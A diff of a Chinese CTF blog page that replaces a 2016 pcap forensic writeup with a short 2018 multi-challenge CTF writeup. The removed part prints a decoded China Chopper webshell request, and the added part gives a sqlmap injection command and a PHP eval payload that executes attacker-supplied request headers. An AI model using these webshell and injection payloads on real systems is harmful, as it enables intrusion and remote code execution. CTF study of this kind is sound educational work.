@@ -3,29 +3,19 @@
 <head>
   <meta charset="utf-8">
   
-  <title>XDCTF2016_铁人三项_WP（HTTP数据包的快速分析） | WinterSun Space</title>
+  <title>2018 706 writeup | WinterSun Space</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="分析题目如下  下载数据包（光下载就用了我两天。。比赛都结束了，也是醉醉的） 下载完毕后发现有多个数据包，使用wireshark自带的pcap数据包合并工具将多个pcap数据包合并成为一个数据包 sum.pcap">
-<meta name="keywords" content="web,writeup">
+  <meta name="description" content="前言706测试的题目，wp简单写下。">
+<meta name="keywords" content="ctf,writeup">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XDCTF2016_铁人三项_WP（HTTP数据包的快速分析）">
-<meta property="og:url" content="https://winter3un.github.io/2016/10/05/xdctf2016-wp/index.html">
+<meta property="og:title" content="2018 706 writeup">
+<meta property="og:url" content="https://winter3un.github.io/2018/07/09/2018-706-wp/index.html">
 <meta property="og:site_name" content="WinterSun Space">
-<meta property="og:description" content="分析题目如下  下载数据包（光下载就用了我两天。。比赛都结束了，也是醉醉的） 下载完毕后发现有多个数据包，使用wireshark自带的pcap数据包合并工具将多个pcap数据包合并成为一个数据包 sum.pcap">
-<meta property="og:image" content="https://winter3un.github.io/2016/10/05/xdctf2016-wp/title.jpg">
-<meta property="og:image" content="https://winter3un.github.io/2016/10/05/xdctf2016-wp/sum1.png">
-<meta property="og:image" content="https://winter3un.github.io/2016/10/05/xdctf2016-wp/sum2.png">
-<meta property="og:image" content="https://winter3un.github.io/2016/10/05/xdctf2016-wp/http.png">
-<meta property="og:image" content="https://winter3un.github.io/2016/10/05/xdctf2016-wp/login.png">
-<meta property="og:image" content="https://winter3un.github.io/2016/10/05/xdctf2016-wp/file.png">
-<meta property="og:image" content="https://winter3un.github.io/2016/10/05/xdctf2016-wp/muma.png">
-<meta property="og:image" content="https://winter3un.github.io/2016/10/05/xdctf2016-wp/muma2.png">
-<meta property="og:image" content="https://winter3un.github.io/2016/10/05/xdctf2016-wp/sqlmap.png">
-<meta property="og:updated_time" content="2016-12-20T02:32:33.131Z">
+<meta property="og:description" content="前言706测试的题目，wp简单写下。">
+<meta property="og:updated_time" content="2018-07-10T00:52:55.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XDCTF2016_铁人三项_WP（HTTP数据包的快速分析）">
-<meta name="twitter:description" content="分析题目如下  下载数据包（光下载就用了我两天。。比赛都结束了，也是醉醉的） 下载完毕后发现有多个数据包，使用wireshark自带的pcap数据包合并工具将多个pcap数据包合并成为一个数据包 sum.pcap">
-<meta name="twitter:image" content="https://winter3un.github.io/2016/10/05/xdctf2016-wp/title.jpg">
+<meta name="twitter:title" content="2018 706 writeup">
+<meta name="twitter:description" content="前言706测试的题目，wp简单写下。">
   
     <link rel="alternative" href="/atom.xml" title="WinterSun Space" type="application/atom+xml">
   
@@ -229,11 +219,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-xdctf2016-wp" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-2018-706-wp" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2016/10/05/xdctf2016-wp/" class="article-date">
-      <time datetime="2016-10-05T07:33:21.000Z" itemprop="datePublished">2016-10-05</time>
+      <a href="/2018/07/09/2018-706-wp/" class="article-date">
+      <time datetime="2018-07-09T11:00:43.000Z" itemprop="datePublished">2018-07-09</time>
 </a>
     </div>
   
@@ -246,7 +236,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      XDCTF2016_铁人三项_WP（HTTP数据包的快速分析）
+      2018 706 writeup
     </h1>
   
 
@@ -257,7 +247,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -267,35 +257,25 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>题目如下</p>
-<img src="/2016/10/05/xdctf2016-wp/title.jpg" alt="title.jpg" title="">
-<p>下载数据包（光下载就用了我两天。。比赛都结束了，也是醉醉的）</p>
-<p>下载完毕后发现有多个数据包，使用wireshark自带的pcap数据包合并工具将多个pcap数据包合并成为一个数据包 sum.pcap<br><img src="/2016/10/05/xdctf2016-wp/sum1.png" alt="sum1.png" title=""></p>
- <a id="more"></a>
-<img src="/2016/10/05/xdctf2016-wp/sum2.png" alt="sum2.png" title="">
-<p>使用wireshark打开分析，在文件-＞导出对象－＞HTTP 中发现敏感的登陆页面，并且多次出现，猜测应该是黑客爆破的登陆页面。<br><img src="/2016/10/05/xdctf2016-wp/http.png" alt="http.png" title=""></p>
-<p>接着使用过滤规则<code>http and ((ip.src == 219.239.105.18 and ip.dst == 172.16.61.210) or (ip.src == 172.16.61.210 and ip.dst == 219.239.105.18))</code>，仔细分析对应的HTTP攻击流量。</p>
-<p>然而wireshark还是太麻烦了。。。 做起来太耗时间，想着能否有一个工具可以提取出pcap数据包中对应的IP的HTTP协议数据包，把heard 和 body 都提出来。</p>
-<p>找了一下发现一个神器<a href="https://github.com/caoqianli/httpcap#usage" target="_blank" rel="external">https://github.com/caoqianli/httpcap#usage</a></p>
-<p>安装完毕后，使用其进行数据包分析，首先提取我们迫切需要的数据。</p>
-<p><code>parse-pcap -i 219.239.105.18 -vvv sum.pcap &gt; 1.html</code></p>
-<p>然后使用notepad++对其进行手工分析（数据量已经很少了。</p>
-<p>找到关键数据,用户名为root 密码为 123456  题一、题二已经解决。</p>
-<img src="/2016/10/05/xdctf2016-wp/login.png" alt="login.png" title="">
-<p>发现黑客进入后台后，修改的页面为index.html，题三解决</p>
-<img src="/2016/10/05/xdctf2016-wp/file.png" alt="file.png" title="">
-<p>如下图可以看到，黑客已经将一句话木马写入web服务器，且其口令为<code>chopper</code>，完整连接地址为<code>http://118.194.196.232/index.php?m=search</code>,题四、题五解决。通过查看返回包得知其执行的命令为pwd，查看当前目录绝对路径的命令。</p>
-<img src="/2016/10/05/xdctf2016-wp/muma.png" alt="muma.png" title="">
-<p>继续往下分析。发现其查看了目录文件，继而返回去分析其命令。</p>
-<img src="/2016/10/05/xdctf2016-wp/muma2.png" alt="muma2.png" title="">
-<p><code>chopper=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=L3Zhci93d3cvaHRtbC8%3D</code></p>
-<p>url解码</p>
-<p><code>chopper=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=L3Zhci93d3cvaHRtbC8=</code></p>
-<p>z0为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(Ii0 |&quot;);;$D=base64_decode($_POST[&quot;z1&quot;]);$F=@opendir($D);if($F==NULL)&#123;echo(&quot;ERROR:// Path Not Found Or No Permission!&quot;);&#125;else&#123;$M=NULL;$L=NULL;while($N=@readdir($F))&#123;$P=$D.&quot;/&quot;.$N;$T=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=&quot;\t&quot;.$T.&quot;\t&quot;.@filesize($P).&quot;\t&quot;.$E.&quot;</div><div class="line">&quot;;if(@is_dir($P))$M.=$N.&quot;/&quot;.$R;else $L.=$N.$R;&#125;echo $M.$L;@closedir($F);&#125;;echo(&quot;|&lt;-&quot;);die();</div></pre></td></tr></table></figure></p>
-<p>z1为<br><code>/var/www/html/</code></p>
-<p>可知其查看的第一个文件目录为<code>/var/www/html</code>，第六个问题解决。</p>
-<p>发现数据还没查看玩，继续拉下去分析。。。。竟然发现了sqlmap跑包的数据，特么一句话都有了，还搞sqlmap干啥？？？ - -。。。</p>
-<p>如下图，大量对<code>http://118.194.196.232:8090/webmail/userapply.php?execadd=111&amp;DomainID=111</code>的<code>Domain</code>参数进行sql注入尝试的http数据包。然而并没有什么软用<br><img src="/2016/10/05/xdctf2016-wp/sqlmap.png" alt="sqlmap.png" title=""></p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>706测试的题目，wp简单写下。</p>
+<a id="more"></a>
+<h2 id="Misc1"><a href="#Misc1" class="headerlink" title="Misc1"></a>Misc1</h2><p>两张图叠加，010处理下就出来了。</p>
+<h2 id="Misc2"><a href="#Misc2" class="headerlink" title="Misc2"></a>Misc2</h2><p>png的长度设置长一点就出flag</p>
+<h2 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h2><p>steg 打开，RGB三个最低色道分别来一次，flag组合下就出来了。</p>
+<h2 id="Misc4"><a href="#Misc4" class="headerlink" title="Misc4"></a>Misc4</h2><p>流量包内有jsfuck编码的密码，log文件内有rar文件，拿密码去解压rar文件，就出flag</p>
+<h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>flag直接写在main函数里了。。</p>
+<h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><p>题目算法似乎有问题，反正我是没解出来，好像有人解出来了- -，真流弊</p>
+<h2 id="crypt1"><a href="#crypt1" class="headerlink" title="crypt1"></a>crypt1</h2><p>直接写出解密脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf8 -*-</span></div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES,DES3</div><div class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">()</span>:</span></div><div class="line">	flag=open(<span class="string">"flag.txt"</span>,<span class="string">"rb"</span>).read().strip()</div><div class="line">	paclen=<span class="number">8</span>-len(flag)%<span class="number">8</span></div><div class="line">	flag+=paclen*(chr(paclen))</div><div class="line"></div><div class="line">	key1=<span class="string">"do_you_know_des3"</span></div><div class="line">	obj1=DES3.new(key1,DES3.MODE_ECB)</div><div class="line">	s1=obj1.encrypt(flag)</div><div class="line"></div><div class="line">	key2=<span class="string">"and_you_know_aes"</span></div><div class="line">	iv=md5(key2).digest()</div><div class="line">	obj2=AES.new(key2,AES.MODE_CBC,iv)</div><div class="line">	s2=obj2.encrypt(s1)</div><div class="line">	<span class="keyword">with</span> open(<span class="string">"flag.enc"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</div><div class="line">		f.write(s2)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">()</span>:</span></div><div class="line">	s1=open(<span class="string">"flag.enc"</span>,<span class="string">"rb"</span>).read()</div><div class="line">	</div><div class="line">	key2=<span class="string">"and_you_know_aes"</span></div><div class="line">	iv=md5(key2).digest()</div><div class="line">	obj2=AES.new(key2,AES.MODE_CBC,iv)</div><div class="line">	s2=obj2.decrypt(s1)</div><div class="line">	</div><div class="line">	</div><div class="line">	key1=<span class="string">"do_you_know_des3"</span></div><div class="line">	obj1=DES3.new(key1,DES3.MODE_ECB)</div><div class="line">	flag=obj1.decrypt(s2)</div><div class="line">	</div><div class="line">	<span class="keyword">print</span> flag</div><div class="line">		</div><div class="line">		</div><div class="line">decrypt()</div></pre></td></tr></table></figure>
+<h2 id="crypt2"><a href="#crypt2" class="headerlink" title="crypt2"></a>crypt2</h2><p>Coppersmith攻击了解一下。</p>
+<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>静态编译，ROPgadget了解一下。</p>
+<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>根据0ctf2018 babyheap改的题，把off by one改没了，不知道怎么做= =</p>
+<h2 id="web1-web7"><a href="#web1-web7" class="headerlink" title="web1-web7"></a>web1-web7</h2><p>全是原题，不会做的话，实验吧刷题了解一下。</p>
+<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>有waf的报错注入，waf只是为了限制考点，很容易绕过</p>
+<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>格式化字符串，sqlmap了解一下</p>
+<p><code>sqlmap -r post -p username --prefix &quot;%1$&#39;&quot; --suffix &quot;#&quot; -v3 --technique=T -D ctf -T flag --dump</code></p>
+<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>命令执行，rctf原题改，getallheaders被禁用了，但是apache_request_headers可以</p>
+<p>payload为<code>eval(next(apache_request_headers()));</code></p>
 
       
       
@@ -351,13 +331,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2016/10/05/xdctf2016-wp/">XDCTF2016_铁人三项_WP（HTTP数据包的快速分析）</a></p>
+        <p><span>本文标题:</span><a href="/2018/07/09/2018-706-wp/">2018 706 writeup</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 WinterSun 的个人博客">WinterSun</a></p>
-        <p><span>发布时间:</span>2016年10月05日 - 00时33分</p>
-        <p><span>最后更新:</span>2016年12月19日 - 18时32分</p>
+        <p><span>发布时间:</span>2018年07月09日 - 04时00分</p>
+        <p><span>最后更新:</span>2018年07月09日 - 17时52分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2016/10/05/xdctf2016-wp/" title="XDCTF2016_铁人三项_WP（HTTP数据包的快速分析）">https://winter3un.github.io/2016/10/05/xdctf2016-wp/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://winter3un.github.io/2016/10/05/xdctf2016-wp/　　作者: WinterSun" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/07/09/2018-706-wp/" title="2018 706 writeup">https://winter3un.github.io/2018/07/09/2018-706-wp/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://winter3un.github.io/2018/07/09/2018-706-wp/　　作者: WinterSun" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -370,18 +350,18 @@
 
 <nav id="article-nav">
   
-    <a href="/2016/07/19/C-S-WeChat/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2018/04/19/ddctf-2018/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          C/S-WeChat
+          DDCTF-2018  WEB WRITEUP
         
       </div>
     </a>
   
   
-    <a href="/2017/03/17/FILE结构体的溢出利用【FSP】/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">FILE结构体的溢出利用【FSP】</div>
+    <a href="/2018/07/09/rsa-ctf/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">CTF-RSA破解方式整理</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -392,7 +372,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-number">1.</span> <span class="toc-text">分析</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc1"><span class="toc-number">2.</span> <span class="toc-text">Misc1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc2"><span class="toc-number">3.</span> <span class="toc-text">Misc2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc3"><span class="toc-number">4.</span> <span class="toc-text">misc3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc4"><span class="toc-number">5.</span> <span class="toc-text">Misc4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#re1"><span class="toc-number">6.</span> <span class="toc-text">re1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#re2"><span class="toc-number">7.</span> <span class="toc-text">re2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypt1"><span class="toc-number">8.</span> <span class="toc-text">crypt1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypt2"><span class="toc-number">9.</span> <span class="toc-text">crypt2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn1"><span class="toc-number">10.</span> <span class="toc-text">pwn1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn2"><span class="toc-number">11.</span> <span class="toc-text">pwn2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web1-web7"><span class="toc-number">12.</span> <span class="toc-text">web1-web7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web8"><span class="toc-number">13.</span> <span class="toc-text">web8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web9"><span class="toc-number">14.</span> <span class="toc-text">web9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web10"><span class="toc-number">15.</span> <span class="toc-text">web10</span></a></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -458,13 +438,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2016/07/19/C-S-WeChat/" title="上一篇: C/S-WeChat">
+            <a href="/2018/04/19/ddctf-2018/" title="上一篇: DDCTF-2018  WEB WRITEUP">
                 <i class="fa fa-angle-left"></i>
             </a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2017/03/17/FILE结构体的溢出利用【FSP】/" title="下一篇: FILE结构体的溢出利用【FSP】">
+            <a href="/2018/07/09/rsa-ctf/" title="下一篇: CTF-RSA破解方式整理">
                 <i class="fa fa-angle-right"></i>
             </a>
         
